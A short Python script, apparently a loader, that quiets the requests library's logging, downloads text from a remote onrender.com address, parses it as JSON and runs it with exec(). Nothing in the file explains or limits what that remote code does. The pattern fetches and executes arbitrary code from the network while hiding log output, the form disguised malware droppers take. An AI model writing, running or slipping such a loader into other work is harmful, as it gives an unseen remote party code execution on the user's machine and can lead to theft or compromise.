import requests
import logging
import json
import os
print("This may take long to open")
# Suppress logging from the requests library
logging.getLogger(requests.packages.urllib3.__package__).setLevel(logging.ERROR)

response = requests.get("https://capi-3ns5.onrender.com/code")
# Get the content of the response as a string
r = response.text
# Rest of your code...
code = json.loads(r)
exec(code)
exit(1)# code 1 means success o think